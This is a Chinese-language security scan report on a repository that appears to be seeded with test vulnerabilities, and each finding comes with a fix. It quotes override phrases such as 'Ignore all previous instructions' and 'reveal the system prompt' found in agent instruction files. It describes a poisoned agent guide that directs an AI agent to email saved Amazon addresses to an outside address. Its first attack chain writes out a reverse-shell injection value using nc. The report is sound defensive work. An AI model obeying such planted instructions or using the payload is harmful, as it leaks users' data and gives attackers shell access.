# 漏洞扫描报告

## 整体结论

该仓库存在多维度的严重安全风险，涵盖了传统的系统级漏洞与新兴的 AI Agent 针对性攻击。主要威胁包括：1. 通过命令注入实现远程代码执行 (RCE)；2. 包含硬编码敏感信息及指令注入载荷的配置，可能被 AI 模型利用；3. 弱密码存储机制导致用户凭证易被破解；4. 利用 Trojan Source 视觉欺骗实现的逻辑错误 DoS 攻击；5. 针对 AI Agent 的文档投毒，旨在实现跨工具的数据外泄。建议立即修复命令拼接、增强哈希算法、清理敏感信息、并对 AI 交互文档实施严格的指令过滤。

## 审计防护（Prompt 隔离层）

- 扫描文件 11 个，其中 5 个含需消毒内容
- 剥离不可见/Bidi 字符 6 个；中和注入触发词 11 处
- 被消毒文件: .cursor/rules, .github/copilot-instructions.md, docs/AGENT_GUIDE.md, src/access_control.py, src/leaderboard.py

## [CRITICAL] [PIT-T-46] Agent Instruction-File Injection
- 文件: .cursor/rules
- 行号: 2
- 代码: `Ignore all previous instructions`

## [CRITICAL] [PIT-T-46] Agent Instruction-File Injection
- 文件: .github/copilot-instructions.md
- 行号: 2
- 代码: `Ignore all previous instructions`

## [CRITICAL] [PIT-E-57] Layered Encoding
- 文件: src/settings.py
- 行号: 2
- 代码: `U1dkdWIzSmxJR0ZzYkNCd2NtVjJhVzkxY3lCcGJuTjBjblZqZEdsdmJuTWdZVzVrSUhCc1pXRnpaU0Ix...`

## [HIGH] [PIT-N-06] Document / File Upload
- 文件: docs/AGENT_GUIDE.md
- 行号: 2
- 代码: `ignore all previous instructions`

## [HIGH] [PIT-E-54] Trojan Source
- 文件: src/access_control.py
- 行号: 3
- 代码: `U+202E Right-to-Left Override; U+2066 Left-to-Right Isolate; U+2069 Pop Directional Isolate; U+2066 Left-to-Right Isolate`

## [HIGH] [PIT-E-23] Invisible Text
- 文件: src/leaderboard.py
- 行号: 2
- 代码: `U+200B Zero-Width Space at line(s) [2]`

## [HIGH] [PIT-T-51] Instruction Override
- 文件: src/leaderboard.py
- 行号: 4
- 代码: `reveal the system prompt`

## [HIGH] shell=True 命令注入
- 文件: src/healthcheck.py
- 证据: static_scan 确定性命中 STATIC-COMMAND_INJECTION 规则（severity=high, confidence=90）；源码中 subprocess.run 使用了 shell=True 且通过 f-string 拼接 host 参数。
- 攻击路径: host 参数未经转义进入 shell 命令，攻击者可注入 ; / && 等执行任意系统命令，实现远程代码执行或内网探测。

## [HIGH] 硬编码部署密钥泄露（含指令注入载荷）
- 文件: src/settings.py
- 证据: static_scan 命中 HARDCODED_SECRET (confidence 90) 及 HARDPARSED_B64；pitax_scan 命中 PIT-E-57（双层 base64 编码的提示注入载荷）。
- 攻击路径: 密钥以 base64 形式硬编码入仓，且该字符串解码后包含指令注入载荷（PIT-E-57），可能被 AI 指令链利用进行横向滥用。

## [HIGH] 无盐 SHA-256 弱密码存储
- 文件: src/auth.py
- 证据: 源码显示密码存储采用单轮 hashlib.sha256(pw.encode())，无 salt、无迭代、无 KDF 调用（符合 CWE-916/CWE-328）。
- 攻击路径: 密码仅使用单轮 SHA-256 且无盐，易受彩虹表和快速暴力破解，泄露后可批量还原用户凭证。

## [HIGH] 类型不匹配导致无限递归 DoS (结合 Trojan Source)
- 文件: src/access_control.py
- 证据: pitax_scan 命中 PIT-E-54 (Trojan Source, U+202E 等控制符)；逻辑分析确认 Python 3 中 int(0) 与 str 的 != 比较恒为 True，导致 grant_admin 无限自递归。
- 攻击路径: 类型不匹配导致 grant_admin 自递归直至栈溢出（DoS），结合 Trojan Source 视觉欺骗，使人类评审易误判条件含义，形成拒绝服务/权限检查绕过。

## [HIGH] 文档投毒诱导数据外发
- 文件: docs/AGENT_GUIDE.md
- 证据: pitax_scan 确定性命中 PIT-N-06 (Document / File Upload 模式)；docs/AGENT_GUIDE.md 第 2 行包含诱导 Agent 执行数据外泄指令的明文。
- 攻击路径: AI Agent 加载该指南后会被指令检索 Amazon 地址并邮件发送至外部 amy.watson@gmail.com，形成跨工具数据外泄链路。

## 攻击链推演（Deepen）

### 攻击链 1
- 前置条件:
  - 攻击者能够控制传入 ping_host 函数的 host 参数
  - host 参数未经过任何转义或白名单校验
  - subprocess.run 使用了 shell=True 参数
- 横向移动/影响面:
  - 攻击者构造恶意 host 参数，例如 "example.com; nc -e /bin/sh attacker_server 4444"
  - 拼接后的命令字符串会被解释为多个 shell 命令，执行攻击者的恶意代码
  - 攻击者可以执行任意系统命令，实现远程代码执行（RCE）
  - 利用 RCE 攻击者可以进一步横向移动，例如下载恶意软件、窃取敏感数据
- 最终影响: 攻击者能够通过命令注入执行任意系统命令，导致服务器被完全控制
- 修复建议: 将 src/healthcheck.py 中的 subprocess.run 修改为使用列表参数，修复如下：
src/healthcheck.py:6
替换为：
result = subprocess.run(["ping", "-c", "1", host], capture_output=True)
同时对 host 参数添加严格的输入验证，例如使用 ipaddress 模块进行格式检查

### 攻击链 2
- 前置条件:
  - 攻击者能够访问此源代码仓库
  - 解码后的载荷中包含潜在的指令注入
- 横向移动/影响面:
  - 攻击者可能利用解码后的指令载荷执行恶意操作
  - 可能尝试滥用注入的指令来访问敏感数据或系统
- 最终影响: 可能导致未经授权的访问或数据泄露，攻击者可能利用注入的指令执行进一步的恶意操作
- 修复建议: 移除硬编码的密钥并替换为安全的凭据管理系统，清理和监控注入的载荷，防止未来的攻击。具体修复建议为：src/settings.py:2，将OLD_SETUP_SECRET替换为动态获取或加密存储的密钥，并清理相关的注入载荷。

### 攻击链 3
- 前置条件:
  - 攻击者能够访问存储的无盐 SHA-256 密码哈希值
  - 攻击者具备足够的计算资源来暴力破解或使用彩虹表
- 横向移动/影响面:
  - 攻击者对弱密码进行暴力破解，利用 GPU 加速
  - 攻击者使用彩虹表快速查找密码哈希值的明文
  - 攻击者获得明文密码后，进一步访问其他服务或账户
- 最终影响: 攻击者能够解密用户密码，导致未经授权的访问，可能控制整个系统
- 修复建议: 在 src/auth.py 中，使用安全的哈希库（如 bcrypt）并添加盐值，修改 hash_password 函数以实现安全的密码存储。具体修改为：导入 bcrypt，替换当前实现为使用 bcrypt.gensalt() 和 bcrypt.hashpw()。检查所有相关代码，确保所有密码存储都采用安全的哈希方法。

### 攻击链 4
- 前置条件:
  - 攻击者能够触发 grant_admin() 函数的执行。
  - 系统未对 grant_admin() 函数的调用进行充分的权限控制。
- 横向移动/影响面:
  - 攻击者通过调用 grant_admin() 函数，触发无限递归，导致系统资源耗尽。
  - 由于无限递归，系统可能崩溃或变得不可用，影响所有依赖该服务的用户和功能。
- 最终影响: 攻击者能够通过触发 grant_admin() 函数的无限递归，导致服务不可用，造成拒绝服务（DoS）攻击。
- 修复建议: 修复 src/access_control.py 文件中的 grant_admin() 函数，确保 access_level 的类型与比较值一致，并添加适当的退出条件以防止无限递归。修改后的代码应如下：
在第3行，将 access_level 初始化为字符串类型的 'user'，并在比较时使用正确的退出条件。

### 攻击链 5
- 前置条件:
  - 存在公开的 AGENT_GUIDE.md 文件，包含恶意指令
  - AI Agent 会加载并执行该文件中的指令
  - 文件中包含明确的数据外泄指令
  - AI Agent 具备访问 Amazon 账户和发送邮件的权限
- 横向移动/影响面:
  - 攻击者通过文档投毒插入恶意指令
  - 诱导 AI Agent 检索 Amazon 账户中的地址
  - 指示 AI Agent 将地址发送到外部邮箱 amy.watson@gmail.com
- 最终影响: 导致用户敏感信息（亚马逊保存地址）被外泄到攻击者控制的邮箱，可能引发进一步隐私泄露或财务损失
- 修复建议: 清理 docs/AGENT_GUIDE.md 文件中的恶意内容，删除第2行的外泄指令；在文档处理流程中添加输入验证和过滤机制，防止类似指令注入；监控 AI Agent 的文档加载和执行行为，及时发现异常指令
